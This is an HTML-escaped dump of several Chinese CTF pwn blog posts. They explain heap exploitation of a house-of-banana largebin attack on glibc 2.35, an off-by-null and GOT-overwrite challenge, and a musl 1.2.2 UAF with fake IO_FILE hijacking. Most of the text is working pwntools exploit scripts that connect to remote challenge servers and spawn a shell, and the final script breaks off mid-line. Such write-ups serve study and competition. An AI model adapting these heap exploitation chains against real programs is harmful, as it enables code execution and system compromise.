r&#x3D;remote(&quot;39.96.185.98&quot;,1009)elf&#x3D;ELF(&quot;&#x2F;home&#x2F;ubuntu&#x2F;pwn&#x2F;比赛&#x2F;DSCTF&#x2F;eznoted2b1405e&#x2F;eznote&quot;)libc&#x3D;ELF(&quot;&#x2F;home&#x2F;ubuntu&#x2F;glibc-all-in-one&#x2F;libs&#x2F;2.35-0ubuntu3_amd64&#x2F;libc.so.6&quot;)context(arch&#x3D;&quot;amd64&quot;,os&#x3D;&quot;linux&quot;,log_level&#x3D;&quot;debug&quot;)context.terminal &#x3D; [&#39;gnome-terminal&#39;,&#39;-x&#39;,&#39;sh&#39;,&#39;-c&#39;]def dbg():    src&#x3D;&#39;&#39;&#39;    set debug-file-directory &#x2F;home&#x2F;ubuntu&#x2F;glibc-all-in-one&#x2F;libs&#x2F;2.35-0ubuntu3_amd64&#x2F;debug    b *$rebase(0x1102)    &#39;&#39;&#39;    gdb.attach(r,src)    pause()def meau(index):    r.sendlineafter(&quot;&gt; &quot;,str(index))def add(size,content):    meau(1)    r.sendlineafter(&quot;Size: &quot;,str(size))    if len(content)&lt;size:        r.sendlineafter(&quot;Content: &quot;,content)    else:        r.sendafter(&quot;Content: &quot;,content)def delete(index):    meau(2)    r.sendlineafter(&quot;Idx: &quot;,str(index))def edit(index,content):    meau(3)    r.sendlineafter(&quot;Idx: &quot;,str(index))    r.sendlineafter(&quot;Content: &quot;,content)def show(index):    meau(4)    r.sendlineafter(&quot;Idx: &quot;,str(index))##堆块布局for i in range(1):    add(0x400+0x10*i,chr(0x61+i))add(0x400+0x10,chr(0x64))add(0x400+0x30,chr(0x64))add(0x400+0x20,chr(0x64))for i in range(4,7):    add(0x400+0x10*i,chr(0x61+i))##利用漏洞修改size，使得堆块重叠，泄露地址后并恢复堆块结构add(0x14f1,&#39;zzz&#39;)show(0)r.recvuntil(&quot;\n&quot;)heap_base&#x3D;u64(r.recvuntil(&quot;\n&quot;)[:-1].ljust(8,b&#39;\x00&#39;))-0x2110success(&quot;heap_base &#x3D; &quot;+hex(heap_base))delete(0)payload&#x3D;b&#39;\x00&#39;*0x400+p64(0)+p64(0x421)add(0x820,payload)show(2)libc_base&#x3D;u64(r.recvuntil(b&quot;\x7f&quot;,timeout&#x3D;0.1)[-6:].ljust(8,b&quot;\x00&quot;))-0x219ce0success(&quot;libc_base &#x3D; &quot;+hex(libc_base))delete(0)payload&#x3D;b&#39;\x00&#39;*0x400+p64(0)+p64(0x421)payload&#x3D;payload.ljust(0x820,b&#39;\x00&#39;)+p64(0)+p64(0x441)payload&#x3D;payload.ljust(0xc60,b&#39;\x00&#39;)+p64(0)+p64(0x431)payload&#x3D;payload.ljust(0x1090,b&#39;\x00&#39;)+p64(0)+p64(0x451)add(0x14e0,payload)##Largebin_attackdelete(3)add(0x600,&quot;1&quot;)delete(1)main_arena&#x3D;libc_base+0x219c80payload&#x3D;b&#39;\x00&#39;*0x400+p64(0)+p64(0x421)+p64(main_arena+96)*2payload&#x3D;payload.ljust(0x820,b&#39;\x00&#39;)+p64(0x420)+p64(0x440)payload&#x3D;payload.ljust(0xc60,b&#39;\x00&#39;)+p64(0)+p64(0x431)+p64(main_arena+1104)*2+p64(heap_base+0xbfb0)payload+&#x3D;p64(libc_base+0x264040-0x20)#_rtld_global&#x3D;libc_base+0x264040edit(0,payload)add(0x600,&quot;3&quot;)##house of bananasystem_addr&#x3D;libc_base+libc.symbols[&#39;system&#39;]bin_sh_addr&#x3D;libc_base+libc.search(b&#39;&#x2F;bin&#x2F;sh&#39;).__next__()gadget&#x3D;libc_base+0x000000000008004aone_gadget&#x3D;libc_base+0xebcf5#_rtld_global-&gt;next&#x3D;libc_base + 0x265890payload&#x3D;b&#39;\x00&#39;*0x400fake_file_addr&#x3D;heap_base+0x750fake_file&#x3D;b&#39;\x00&#39;*0x18+p64(libc_base + 0x265890)+p64(0)+p64(fake_file_addr)+p64(0)+p64(one_gadget)fake_file&#x3D;fake_file.ljust(0x48,b&#39;\x00&#39;)fake_file+&#x3D;p64(fake_file_addr+0x58)+p64(8)+p64(gadget)fake_file&#x3D;fake_file.ljust(0x110,b&#39;\x00&#39;)fake_file+&#x3D;p64(fake_file_addr+0x40)+p64(0)+p64(fake_file_addr+0x48)+p64(8)fake_file&#x3D;fake_file.ljust(0x31c,b&#39;\x00&#39;)fake_file+&#x3D;p32(0x1c)payload&#x3D;payload+fake_fileedit(0,payload)pause()meau(5)r.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>远端拿到flag：</p><p><img src="/../pictures/house_of_banana/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20220718022654.png"></p><h1 id="在学习过程中参考的大佬们的资料"><a href="#在学习过程中参考的大佬们的资料" class="headerlink" title="在学习过程中参考的大佬们的资料"></a>在学习过程中参考的大佬们的资料</h1><ol><li><a href="https://giles-one.github.io/2021/10/04/house-of-%E7%B3%BB%E5%88%97%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/">https://giles-one.github.io/2021/10/04/house-of-%E7%B3%BB%E5%88%97%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/</a></li><li><a href="https://abf1ag.github.io/2021/12/06/house-of-banana/">https://abf1ag.github.io/2021/12/06/house-of-banana/</a></li><li><a href="https://www.secpulse.com/archives/180765.html">https://www.secpulse.com/archives/180765.html</a></li><li><a href="https://www.anquanke.com/post/id/222948">https://www.anquanke.com/post/id/222948</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于ql题目的wp</title>
      <link href="/posts/29696.html"/>
      <url>/posts/29696.html</url>
      
        <content type="html"><![CDATA[<h2 id="关于ql题目的wp"><a href="#关于ql题目的wp" class="headerlink" title="关于ql题目的wp"></a>关于ql题目的wp</h2><p>这道题目中的IDA逆向不放了，重点就是只能释放一次和编辑一次，并且堆块也只能申请一个。</p><p>漏洞在于my_read时有off by null漏洞。</p><p>我们可以通过off by null修改到管理堆块的写入地址。</p><p><img src="/../pictures/%E5%85%B3%E4%BA%8Eql%E9%A2%98%E7%9B%AE%E7%9A%84wp/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20220518192412.png"></p><p>重点就在于没有setvbuf初始化输入缓冲区，这样我们在确定是否退出时调用sacnf函数，scanf函数就会申请到一个0x1000大小的堆块，并且我们可以向这个堆块上不断调用scanf函数来伪造堆块。之后我们再申请一个堆块，并覆盖指针末位为’\x00’，之后我们使用仅有一次的free，这样我们就释放掉了那个伪造的0x60大小的堆块。然后我们再将这个堆块申请出来，我们就达到了控制指针实现任意写的目的。这时候我们调用仅有一次的edit机会，将exit的got表覆盖为free的free_plt+6，同时将atoi_got覆盖为printf_plt+6，这样下次调用atoi函数时，我们就可以调用格式化字符串漏洞来泄露libc基址。因为修改了exit的got表，这样我们就获得了无限次的delete和edit的机会。之后我们泄露libc的基址。然后再下一次输入选择什么操作时，我们再次用任意写的机会，将atoi的got表改为system的地址即可。</p><p>重点想要记录的是，scanf函数在输入缓冲区未初始化时申请0x1000大小的堆块，并且我们可以调用scanf向这个堆块上输入数据。还有就是atoi的got表被修改为printf的got表后，我们只需要输入任意三个字符，这样printf输出这三个字符后，依然可以返回给rax的值为3。虽然我们没有了atoi函数，但是我们仍旧可以达到我们get_int的目的，这样我们仍旧可以选择我们需要的操作。</p><p>scanf函数未初始化缓冲区调用malloc申请堆块的过程：</p><p><code>__isoc99_scanf--&gt;_IO_vfscanf--&gt;_IO_default_uflow--&gt;_IO_doallocbuf--&gt;_IO_file_doallocate--&gt;malloc</code></p><p>抄的池哥的exp：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *r&#x3D;process(&quot;&#x2F;home&#x2F;ubuntu&#x2F;pwn&#x2F;池哥文件&#x2F;课内pwn&#x2F;qianlei&quot;)elf&#x3D;ELF(&quot;&#x2F;home&#x2F;ubuntu&#x2F;pwn&#x2F;池哥文件&#x2F;课内pwn&#x2F;qianlei&quot;)libc&#x3D;ELF(&quot;&#x2F;home&#x2F;ubuntu&#x2F;glibc-all-in-one&#x2F;libs&#x2F;2.23-0ubuntu11.3_amd64&#x2F;libc.so.6&quot;)context(arch&#x3D;&quot;amd64&quot;,os&#x3D;&quot;linux&quot;,log_level&#x3D;&quot;debug&quot;)context.terminal &#x3D; [&#39;gnome-terminal&#39;,&#39;-x&#39;,&#39;sh&#39;,&#39;-c&#39;]def meau(index):    r.sendlineafter(&quot;Your choice:&quot;,str(index))def add(size,content,name):    meau(1)    r.sendlineafter(&quot;Size:&quot;,str(size))    r.sendafter(&quot;Content:&quot;,content)    r.sendafter(&quot;Name:&quot;,name)def delete():    meau(2)def edit(content):    meau(3)    r.sendafter(&quot;Content:&quot;,content)def exit(payload):    meau(4)    r.sendafter(&quot;Really?(Y&#x2F;N)&quot;,payload)def dbg():    gdb.attach(r,&quot;b *0x400D0A&quot;)    pause()dbg()payload &#x3D; b&#39;a&#39; * 0xd10 + p64(0) + p64(0x2d0) + p64(0x602090) + p64(0x602098) + b&#39;a&#39; * 0x2b0 + p64(0x2d0) + p64(0x71)exit(payload)sleep(1)for i in range(0x7f7):    r.sendlineafter(&quot;Your choice:&quot;, &quot;4&quot;)payload &#x3D; b&#39;a&#39; * 0x20 + p64(0) + p64(0x51)add(0x70, payload , &quot;aaaaaaaa&quot;)delete()payload&#x3D;p64(0)*3+p64(0x21)+p64(0x60)+p64(0)+p64(0x602020)+p64(0x81)add(0x60,payload,&quot;bbbbb&quot;)free_plt&#x3D;elf.plt[&#39;free&#39;]read_chk_plt&#x3D;elf.plt[&#39;__read_chk&#39;]puts_plt&#x3D;elf.plt[&#39;puts&#39;]stack_chk_fail_plt&#x3D;elf.plt[&#39;__stack_chk_fail&#39;]printf_plt&#x3D;elf.plt[&#39;printf&#39;]alarm_plt&#x3D;elf.plt[&#39;alarm&#39;]read_plt&#x3D;elf.plt[&#39;read&#39;]signal_plt&#x3D;elf.plt[&#39;signal&#39;]malloc_plt&#x3D;elf.plt[&#39;malloc&#39;]setvbuf_plt&#x3D;elf.plt[&#39;setvbuf&#39;]atoi_plt&#x3D;elf.plt[&#39;atoi&#39;]scanf_plt&#x3D;elf.plt[&#39;__isoc99_scanf&#39;]payload&#x3D;p64(free_plt+6)payload+&#x3D;p64(read_chk_plt+6)payload+&#x3D;p64(puts_plt+6)payload+&#x3D;p64(stack_chk_fail_plt+6)payload+&#x3D;p64(printf_plt+6)payload+&#x3D;p64(alarm_plt+6)payload+&#x3D;p64(read_plt+6)payload+&#x3D;p64(signal_plt+6)payload+&#x3D;p64(malloc_plt+6)payload+&#x3D;p64(setvbuf_plt+6)payload+&#x3D;p64(printf_plt+6)# dbg()edit(payload)puts_got&#x3D;elf.got[&#39;puts&#39;]meau(str(puts_got))libc_base&#x3D;u64(r.recvuntil(b&quot;\x7f&quot;)[-6:].ljust(8,b&quot;\x00&quot;))-6230376success(&quot;libc_base &#x3D; &quot;+hex(libc_base))system_addr&#x3D;libc_base+libc.symbols[&#39;system&#39;]payload&#x3D;p64(free_plt+6)payload+&#x3D;p64(read_chk_plt+6)payload+&#x3D;p64(puts_plt+6)payload+&#x3D;p64(stack_chk_fail_plt+6)payload+&#x3D;p64(printf_plt+6)payload+&#x3D;p64(alarm_plt+6)payload+&#x3D;p64(read_plt+6)payload+&#x3D;p64(signal_plt+6)payload+&#x3D;p64(malloc_plt+6)payload+&#x3D;p64(setvbuf_plt+6)payload+&#x3D;p64(system_addr)r.sendafter(&quot;Your choice:&quot;,&quot;aaa&quot;)r.sendafter(&quot;Content:&quot;,payload)r.sendafter(&quot;Your choice:&quot;,&quot;&#x2F;bin&#x2F;sh\x00&quot;)r.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>参考资料：</p><p><a href="https://ray-cp.github.io/archivers/IO_FILE_fread_analysis">https://ray-cp.github.io/archivers/IO_FILE_fread_analysis</a></p>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>musl 1.2.2 pwn</title>
      <link href="/posts/37632.html"/>
      <url>/posts/37632.html</url>
      
        <content type="html"><![CDATA[<h2 id="CTF-babynote"><a href="#CTF-babynote" class="headerlink" title="*CTF babynote"></a>*CTF babynote</h2><p>这道题目主要是<del>抄袭</del>参考了这个大佬的文章：<a href="https://eqqie.cn/index.php/archives/1931">https://eqqie.cn/index.php/archives/1931</a></p><p>先分析一下菜单中的4个函数：</p><p>add函数分析：</p><p><img src="/../pictures/musl_pwn/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20220512213012.png"></p><p>get_name函数：</p><p><img src="/../pictures/musl_pwn/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20220512213145.png"></p><p>get_content函数：</p><p><img src="/../pictures/musl_pwn/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20220512213147.png"></p><p>从add函数中我们可以看到，首先申请了一个0x28大小的堆块来用于管理所有的结构,就是图上的v1。然后申请一个任意大小的堆块用来存储name，并将堆指针放在了v1[0]处，将name的size放在了v1[2]处，而同样申请了一个任意大小的堆块用于存储content，v1[1]处存放content内容堆块的指针，v1[3]处存放content堆块的size，然后v1[4]用于存储当前0x4010处的当前指针。但是之后更新了0x4010处的值为当前管理堆块的指针，然后下一次申请时，这个指针被放到了下一次申请到的管理堆块的v1[4]处，因此这就形成了一个链表。我们总是可以通过寻找v1[4]处的指针，找到之前申请到的堆块，而0x4010指向了最后一个管理堆块的地址，也就是说0x4010指向链表的末尾。后面的search函数正是用了这个原理来查找堆块。</p><p>find函数：</p><p><img src="/../pictures/musl_pwn/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20220512225003.png"></p><p>search函数：</p><p><img src="/../pictures/musl_pwn/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20220512224824.png"></p><p>这个find函数中，本身是想要通过用户输入堆块的名字进行查找，因此要求先输入大小，然后再申请一个输入大小的堆块，之后让用户输入名字，再根据名字进行查找。查找到了就返回一个找到的地址，这个地址指向那个存放存放堆块姓名的地址，实际上就是那个管理堆块的地址，因此后面的my_print传入的就是堆块的内容和内容的大小，就是上面的v1[1]和v1[3]。</p><p>这里着重讲一下那个search函数的寻找规则。由于add函数中管理堆块v1[4]存放的是0x4010处的指针，而之后0x4010处又更新成v1。因此，管理堆块的v1[4]处，实际上存放的就是上一次申请到的管理堆块的地址，因此search函数在寻找时，实际上就是从刚刚申请的堆块开始遍历，也就是从堆块的末尾进行遍历操作，如果名字不对，就从v1[4]处找到上一个堆块，然后对比他们的名字，一直寻找。</p><p>这里的find函数还有一个利用的技巧就是他不仅能够泄露数据，由于一开始申请了一个堆块而最后又释放掉了这个堆块，并且不论查找到或者没有查找到都会进行这样的操作。因此我们可以申请0x28大小的堆块，用于我们填充gruop结构中的数量，方便我们对任意大小的gruop中chunk的数量进行控制。</p><p>delete函数：</p><p><img src="/../pictures/musl_pwn/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20220512213017.png"></p><p>clear函数：</p><p><img src="/../pictures/musl_pwn/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20220512213019.png"></p><p>delete函数和clear是程序的漏洞点所在。我们发现clear函数可以清除0x4010处的地址，这样导致在下一次的堆块申请时，这个堆块的v1[4]处为零，也就导致了search函数找不到之前的堆块。也即是说下一次申请的堆块是开始一个新的链表，下一个申请的堆块是头结点。而delete函数的问题在于，首先是他没有将所有的指针进行清零操作，所以可能会泄露指针的内容，但是我们也不能直接进行利用。不能直接利用的原因是，我们在find函数时先要进行search查找，而查找是通过v1[4]形成的链表进行的。当我们delete时，如果找到了这个管理堆块的指针，我们首先会对于堆块的位置进行判断。</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">if ( name_2_ptr !&#x3D; qword_4010 || qword_4010[4] )<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这个判断操作是判断链表中是不是只有一个头节点</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">if ( name_2_ptr[4] )<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>而这个判断就是单纯地判断是不是找到要删除的节点是头结点</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">if ( name_2_ptr !&#x3D; qword_4010 || qword_4010[4] )&#123;  if ( name_2_ptr[4] )  &#123;    for ( i &#x3D; &amp;qword_4010; name_2_ptr !&#x3D; *i; i &#x3D; (_QWORD **)(*i + 4) )      ;    *i &#x3D; (_QWORD *)name_2_ptr[4];  &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>而图片中的这部分操作就是，如果要删除的节点不是头结点，就将堆块从链表中删除。而这也是虽然数据没有被清除，但是我们不能直接利用的原因。因为search函数会判断是否已经删除过一次。但是问题就出现在delete函数没有对链表的头结点进行判断，而clear函数又可以申请很多的链表，因此这就造成的UAF。</p><p>放上几张gdb图片进行说明：</p><p><img src="/../pictures/musl_pwn/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20220513000553.png"></p><p>这是我们用find函数来查找不存在的堆块，从而用free的堆块来填充group结构。而musl分配的规则是，只有当这个页分配满后，才会查找当前页是否有free的chunk结构，如果有，就将free的chunk结构拿来用，如果没有，经分配一个新的页来分配chunk。</p><p>我们leak信息的思路是，先在group中存放三个free chunk，并只剩下一个空的chunk。之后我们，调用clear函数，使得下一次我们分配的堆块是链表头部，这样即使在我们free掉这个堆块后，我们依然可以对他进行操作。这样在下次分配时，我们申请两个0x28的chunk，由于先分配管理堆块，因此管理堆块占用了group的最后一个chunk，而数据段则找到了上面的free chunk，第一个free chunk就被占用为了数据段content，这就导致了数据堆块在管理堆块的上面，这样最后一个管理堆块chunk，v1[1]就指向了数据content堆块的指针。之后我们再申请一次，同上次一样，含有两个0x28大小的堆块，这样就将group填满了，之后我们释放第一次申请的堆块头部，然后现在整个group有两个free的堆块，并且在下面的管理堆块指向了上一个数据堆块，我们仍旧可以通过漏洞对释放掉的数据堆块内容进行find数据泄露。</p><p>如图所示group中chunk的分布状况：</p><p><img src="/../pictures/musl_pwn/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20220513000902.png"></p><p>之后我们再申请一个0x28的管理堆块，将他的数据堆块分配到其他的group，这样我们就使得链表头部的管理堆块的content指针，指向的是刚刚申请到的管理堆块的name指针，从而实现对于指针的泄露。</p><p>group堆块分布如图所示：</p><p><img src="/../pictures/musl_pwn/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20220513000955.png"></p><p>泄露数据用的都是这个思路，大致都是先构造free chunk，只留下最后一个chunk位置。然后再申请堆块，通过musl分配机制，将数据堆块分配到管理堆块的上面，使得数据堆块从free chunk中寻找，而free chunk的头节点的管理堆块可以在free之后继续使用。因此我们只需要将想要泄露的数据指针，写到原先的头结点chunk，v1[1]处就可以进行泄露。</p><p>通过这个方法，我们泄露出libc的基地址和secrt，用于我们按顺序伪造<code>fake_arena | fake_meta | fake_group | fake_chunk | fake IO_FILE</code>。</p><p>这个是我参考的大佬的思路：</p><ul><li>堆风水+UAF把一个note构造到另一个note的<code>note-&gt;content</code>域下，find功能泄露出elf_base和初始堆地址（musl的初始堆地址在二进制文件的地址空间中）</li><li>再用一种堆风水思路借助UAF构造fake note占用掉发生UAF的原note，构造指针进行任意地址泄露，重复该步骤两次分别泄露libc地址和<code>__malloc+context</code>中的secret（用于后序步骤伪造）</li><li>同样借助UAF构造一个fake note，并从一个页对齐的位置顺序构造<code>fake_arena | fake_meta | fake_group | fake_chunk | fake IO_FILE</code>，fake note的next指向fake_chunk然后构造<code>fake_meta</code>的<code>prev</code>和<code>next</code>使得free<code>fake_note-&gt;next</code>之后的<code>unlink</code>将<code>fake IO_FILE</code>的地址写入到<code>stdout_user</code>中<ul><li>由于<code>__IO_FILE</code>中存在如下指针：<code>size_t (*write)(FILE *, const unsigned char *, size_t);</code>，只要控制好参数和指针就可以进行<code>execve(&quot;/bin/sh&quot;, NULL, NULL)</code>来getshell</li><li>详细的实现细节可以参考[2]中的描述</li></ul></li></ul><p>拿到shell的思路是劫持<code>__stdout_used</code>结构体，将<code>__stdout_used</code>结构体的<code>flags</code>改为<code>&#39;/bin/sh\x00&#39;</code>，然后将<code>write</code>覆盖为<code>execve</code>函数，这样在执行<code>exit</code>函数时，函数调用流程是<code>exit--&gt;__stdio_exit_needed--&gt;close_file</code>，在<code>close_file</code>中调用了，这个时候我们能拿到<code>shell</code>。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">► 0x7ffff7fa39f4 &lt;close_file+36&gt;    call   qword ptr [rbp + 0x48]        &lt;system&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>我们想要劫持<code>__stdout_used</code>结构体，这里我们采用伪造<code>IO_FILE</code>结构体的方式，然后我们利用<code>free</code>时<code>unlink</code>的漏洞，将<code>__stdout_used</code>中写入我们伪造好的地址，这样我们就达到了劫持的目的。</p><p>这篇文章介绍了musl下unlink的利用：<a href="https://www.anquanke.com/post/id/241104">https://www.anquanke.com/post/id/241104</a></p><p>执行前后伪造数据的变化：</p><p>执行前：</p><p><img src="/../pictures/musl_pwn/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20220514004646.png"></p><p>执行后：</p><p><img src="/../pictures/musl_pwn/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20220514004649.png"></p><p>我们发现<code>__stdout_used</code>中已经被我们写入了伪造的<code>IO_FILE</code>内容，之后我们调用<code>exit</code>函数就会走上面的流程。</p><p>这个是Eqqie大佬的wp，就是上面大佬连接的wp。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *context.log_level &#x3D; &quot;debug&quot;# 调试本地环境记得一定要拷贝到这个路径，用ld的启动方式vmmap会很tm怪！# cp .&#x2F;libc.so &#x2F;usr&#x2F;lib&#x2F;x86_64-linux-musl&#x2F;libc.sop &#x3D; process(&quot;.&#x2F;babynote&quot;)p &#x3D; remote(&quot;123.60.76.240&quot;, 60001)def add(name, content, size&#x3D;-1):    p.sendlineafter(b&quot;option: &quot;, b&quot;1&quot;)    if size &gt;&#x3D; 0:        p.sendlineafter(b&quot;name size: &quot;, str(size).encode())    else:        p.sendlineafter(b&quot;name size: &quot;, str(len(name)).encode())    p.sendafter(b&quot;name: &quot;, name)    p.sendlineafter(b&quot;note size: &quot;, str(len(content)).encode())    p.sendafter(b&quot;note content: &quot;, content)    def find(name, size&#x3D;-1):    p.sendlineafter(b&quot;option: &quot;, b&quot;2&quot;)    if size &gt;&#x3D; 0:        p.sendlineafter(b&quot;name size: &quot;, str(size).encode())    else:        p.sendlineafter(b&quot;name size: &quot;, str(len(name)).encode())    p.sendafter(b&quot;name: &quot;, name)    def delete(name):    p.sendlineafter(b&quot;option: &quot;, b&quot;3&quot;)    p.sendlineafter(b&quot;name size: &quot;, str(len(name)).encode())    p.sendafter(b&quot;name: &quot;, name)    def forget():    p.sendlineafter(b&quot;option: &quot;, b&quot;4&quot;)    def exit():    p.sendlineafter(b&quot;option: &quot;, b&quot;5&quot;)def exp():    ## ------------ leak addr info ------------    for i in range(3):        add(bytes([0x41+i])*0xc, bytes([0x61+i])*0x28) # A-C    for i in range(3):        find(b&quot;x&quot;*0x28)    forget()    add(b&quot;E&quot;*0xc, b&quot;e&quot;*0x28) # E uaf    # -- new group    add(b&quot;F&quot;*0xc, b&quot;f&quot;*0x28) # F hold E    delete(b&quot;E&quot;*0xc)    add(b&quot;eqqie&quot;, b&quot;x&quot;*0x38) # occupy        find(b&quot;E&quot;*0xc)        p.recvuntil(b&quot;0x28:&quot;)    leak_heap &#x3D; 0    leak_elf &#x3D; 0    for i in range(8):        leak_heap +&#x3D; int(p.recv(2).decode(), 16) &lt;&lt; (i*8)    for i in range(8):        leak_elf +&#x3D; int(p.recv(2).decode(), 16) &lt;&lt; (i*8)    elf_base &#x3D; leak_elf - 0x4fc0    heap_base &#x3D; elf_base    print(&quot;leak_heap:&quot;, hex(leak_heap))    print(&quot;leak_elf:&quot;, hex(leak_elf))    print(&quot;heap_base:&quot;, hex(heap_base))    print(&quot;elf_base:&quot;, hex(elf_base))        ## ------------ leak libc addr ------------    read_got &#x3D; elf_base+0x3fa8    add(b&quot;Y&quot;*0xc, b&quot;y&quot;*0xc) # occupy    forget() # fresh all    add(b&quot;A&quot;*0x4, b&quot;a&quot;*0x4)    add(b&quot;B&quot;*0x4, b&quot;b&quot;*0x4)    delete(b&quot;A&quot;*0x4)    for i in range(7):        find(b&quot;x&quot;*0x28)    fake_note &#x3D; p64(heap_base+0x4cf0) + p64(read_got) # name(&#39;aaaa&#39;), content(read@got)    fake_note +&#x3D; p64(4) + p64(8) # name_size, content_size    fake_note +&#x3D; p64(0) # next-&gt;null        add(b&quot;C&quot;*0x4, fake_note) # C occupy last chunk    find(b&quot;a&quot;*4)    p.recvuntil(b&quot;0x8:&quot;)    read_got &#x3D; b&quot;&quot;    for i in range(8):        read_got +&#x3D; p8(int(p.recv(2).decode(), 16))    read_got &#x3D; u64(read_got)    print(&quot;read_got:&quot;, hex(read_got))    libc_base &#x3D; read_got - 0x74f10    stdout_used &#x3D; libc_base + 0xb43b0    print(&quot;libc_base:&quot;, hex(libc_base))    print(&quot;stdout_used:&quot;, hex(stdout_used))    for i in range(7):        add(b&quot;y&quot;*0x4, b&quot;y&quot;*0x4) # run out of chunks    forget() # fresh all        ## ------------ leak heap secret ------------    new_heap &#x3D; libc_base - 0xb5000    print(&quot;new_heap:&quot;, hex(new_heap))    heap_secret_ptr &#x3D; libc_base + 0xb4ac0        forget() # fresh all    add(b&quot;A&quot;*0x4, b&quot;a&quot;*0x4)    add(b&quot;B&quot;*0x4, b&quot;b&quot;*0x4)    delete(b&quot;A&quot;*0x4)    for i in range(7):        find(b&quot;x&quot;*0x28)    fake_note &#x3D; p64(heap_base+0x4cb0) + p64(heap_secret_ptr) # name(&#39;aaaa&#39;), content(heap_secret)    fake_note +&#x3D; p64(4) + p64(8) # name_size, content_size    fake_note +&#x3D; p64(0) # next-&gt;null        add(b&quot;C&quot;*0x4, fake_note) # C occupy last chunk    find(b&quot;a&quot;*4)    p.recvuntil(b&quot;0x8:&quot;)    heap_secret &#x3D; b&quot;&quot;    for i in range(8):        heap_secret +&#x3D; p8(int(p.recv(2).decode(), 16))    print(&quot;heap_secret:&quot;, heap_secret)    for i in range(7):        add(b&quot;y&quot;*0x4, b&quot;y&quot;*0x4) # run out of chunks    forget() # fresh all        ## ------------ build fake_meta, fake_chunk ------------    # 关ASLR打本地的时候记得改掉这个偏移    new_heap2 &#x3D; libc_base - 0x7000  # aslr_on&amp;remote: 0x7000  aslr_off: 0xd000    print(&quot;new_heap2:&quot;, hex(new_heap2))    add(b&quot;A&quot;*0x4, b&quot;a&quot;*0x4) # A    ### pointers    system &#x3D; libc_base + 0x50a90    execve &#x3D; libc_base + 0x4f9c0    fake_area_addr &#x3D; new_heap2 + 0x1000    fake_meta_ptr &#x3D; fake_area_addr + 0x20    fake_group_ptr &#x3D; fake_meta_ptr + 0x30    fake_iofile_ptr &#x3D; fake_group_ptr + 0x10    fake_chunk_ptr &#x3D; fake_iofile_ptr - 0x8    print(&quot;system:&quot;, hex(system))    print(&quot;fake_meta_ptr:&quot;, hex(fake_meta_ptr))    print(&quot;fake_group_ptr:&quot;, hex(fake_group_ptr))    print(&quot;fake_iofile_ptr:&quot;, hex(fake_iofile_ptr))    ### fake arena    fake_area &#x3D; heap_secret + b&quot;M&quot; * 0x18    ### fake group    fake_group &#x3D; p64(fake_meta_ptr)        ### fake iofile    fake_iofile &#x3D; p64(0) # chunk prefix: index 0, offset 0    fake_iofile 